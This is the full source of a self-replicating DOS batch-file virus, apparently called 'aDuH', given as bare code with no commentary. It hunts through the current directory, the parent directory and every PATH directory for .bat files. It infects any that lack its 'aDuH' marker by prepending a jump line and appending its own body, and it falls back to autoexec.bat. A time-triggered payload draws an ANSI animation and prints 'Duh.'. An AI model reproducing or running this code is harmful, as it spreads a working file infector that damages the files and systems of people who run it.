@if '%_aduh%==' goto _aduh
::**** HOST ****
@if not '%_aduh%==' goto aDuHend
:_aduh aDuH
@echo off%_aDuH%
if '%1=='aDuH goto aDuH%2
set aDuH=%0.bat
if not exist %aDuH% set aDuH=%0
if '%aDuH%==' set aDuH=autoexec.bat
set !aDuH=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist %aDuH% goto aDuHfe
call %aDuH% aDuH h %path%
if exist %aDuH% goto aDuHfe
goto eaDuH
:aDuHh
shift%_aDuH%
if '%2==' goto aDuHend
if exist %2\%aDuH% set aDuH=%2\%aDuH%
if exist %2%aDuH% set aDuH=%2%aDuH%
if exist %2\%aDuH%.bat set aDuH=%2\%aDuH%.bat
if exist %2%aDuH%.bat set aDuH=%2%aDuH%.bat
if not exist %aDuH% goto aDuHh
goto aDuHend
:aDuHfe
command /e:5000 /c %aDuH% aDuH vir . .. %path%
if exist t$f? del t$f?>nul.aDuH
:eaDuH
echo.|time|find "7">t$f1%_aDuH%
copy t$f1 t$f2>nul.aDuH
del t$f1>nul.aDuH
if not exist t$f2 goto naaDuH
del t$f2>nul.aDuH
echo.|time|find "a">t$f1%_aDuH%
copy t$f1 t$f2>nul.aDuH
del t$f1>nul.aDuH
if not exist t$f2 goto naaDuH
del t$f2>nul.aDuH
echo [0;30;40m[6B [6A[s%_aDuH%
:bg!0 %_aDuH%
echo %bg!%[1;36;40m--O[0;30;40m%_aDuH%
echo %bg!% [1;36;40m--O[0;30;40m%_aDuH%
echo %bg!%  [1;36;40m--O[0;30;40m  %_aDuH%
echo %bg!% [1;36;40m--O[0;30;40m%_aDuH%
echo %bg!%[1;36;40m--O[0;30;40m[u%_aDuH%
set bg!=%bg!%.%!!%%_aDuH%
if not %bg!%==...................... goto bg!0 %_aDuH%
set bg!=%_aDuH%
echo [K[1B[K[1B[K[1B[K[1B[K[1;37;40m%_aDuH%
echo [3A[25CDuh.[2B[0m%_aDuH%
:naaDuH
call %aDuH% aDuH rh
set _aduh=>nul.aDuH
set !aDuH=
set aDuH=
goto aDuHend
:aDuHrh
set _aduh=x%_aDuH%
%aDuH% %!aDuH%
:aDuHvir
shift%_aDuH%
if '%2==' exit aDuH
for %%a in (%2\*.bat %2*.bat) do call %aDuH% aDuH i %%a
goto aDuHvir
:aDuHi
find "aDuH"<%3>t$f1
if exist t$f2 del t$f2>nul.aDuH
copy t$f1 t$f2>nul.aDuH
if exist t$f2 goto aDuHj
echo @if '%%_aduh%%==' goto _aduh>aDuH$
type %3>>aDuH$
echo.>>aDuH$
find "aDuH"<%aDuH%>>aDuH$
copy aDuH$ %3>nul
del aDuH$
exit aDuH
:aDuHj
set aDuH!=%aDuH!%1
if %aDuH!%==11111111 exit
:aDuHend

